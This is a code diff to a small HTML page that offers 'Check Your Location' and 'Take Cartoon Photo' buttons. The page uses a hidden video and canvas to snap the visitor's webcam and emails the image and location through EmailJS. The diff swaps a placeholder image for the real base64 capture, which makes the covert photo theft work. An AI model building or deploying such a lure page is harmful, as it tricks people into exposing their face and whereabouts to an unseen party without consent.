@@ -7,7 +7,7 @@
 <body>
   <h2>Choose an Option</h2>
   <button onclick="sendLocationOnly()">Check Your Location </button>
-  <button onclick="captureAndSend()">Take Carton Photo </button>
+  <button onclick="captureAndSend()">Take Cartoon Photo </button>
 
   <video id="video" autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
@@ -44,8 +44,8 @@
 
       await new Promise(resolve => setTimeout(resolve, 1500));
 
-      canvas.width = 320;
-      canvas.height = 240;
+      canvas.width = 160;
+      canvas.height = 120;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
       const imageBase64 = canvas.toDataURL("image/png");
 
@@ -56,7 +56,7 @@
 
         emailjs.send("service_gkkpt4w", "template_96dsagv", {
           message: message,
-          image: "https://via.placeholder.com/300"
+          image: imageBase64
 
         })
         .then(res => console.log("Photo and location Captured!", res))
